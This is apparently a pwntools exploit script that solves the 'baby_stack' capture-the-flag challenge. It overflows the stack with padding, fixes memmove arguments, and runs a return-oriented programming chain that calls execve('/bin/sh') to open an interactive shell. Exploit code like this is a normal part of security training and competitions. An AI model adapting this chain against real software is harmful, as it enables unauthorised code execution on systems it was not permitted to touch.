from pwn import *

elf = ELF('./baby_stack-7b078c99bb96de6e5efc2b3da485a9ae8a66fd702b7139baf072ec32175076d8', checksec=False)
p = elf.process()
p.sendlineafter('>>', '/bin/sh\x00')
payload = b''.join([
    b'A'*104,                   # padding
    p64(0x522c96), p64(0x5),    # printf->runtime.memmove argument
    
    b'B'*80,                    # padding
    p64(0x522c96), p64(0x5),    # runtime.slicebytetostring->runtime.memmove argument

    b'C'*192,                   # padding

    # $bss+0x1000="/bin/sh"
    # p64(0x00000000004016ea),    # : pop rax; ret; -> fix or byte ptr [rax + 0x39], cl
    # p64(elf.bss()+0x1000),      # junk address
    # p64(0x0000000000470931),    # : pop rdi; or byte ptr [rax + 0x39], cl; ret;
    # p64(elf.bss()+0x1000),      # writeable address
    # p64(0x00000000004016ea),    # : pop rax; ret;
    # p64(0x68732f6e69622f),      # "/bin/sh"
    # p64(0x0000000000456499),    # : mov qword ptr [rdi], rax; ret; 

    # $rdi="/bin/sh"
    p64(0x00000000004016ea),    # : pop rax; ret; -> fix or byte ptr [rax + 0x39], cl
    p64(elf.bss()+0x1000),      # junk address
    p64(0x0000000000470931),    # : pop rdi; or byte ptr [rax + 0x39], cl; ret;
    p64(0xc82008c000),          # static address from first input
    
    # $rsi=0, $rdx=0
    p64(0x000000000046defd),    # : pop rsi; ret;
    p64(0),
    p64(0x00000000004016ea),    # : pop rax; ret; -> fix or byte ptr [rax - 0x77], cl
    p64(elf.bss()+0x1000),      # junk address
    p64(0x00000000004a247c),    # : pop rdx; or byte ptr [rax - 0x77], cl; ret;
    p64(0),

    # syscall(0x3b)
    p64(0x00000000004016ea),    # : pop rax; ret;
    p64(0x3b),                  # execve
    p64(0x00000000004026da)     # syscall
])
p.sendlineafter('>>', payload)
p.interactive()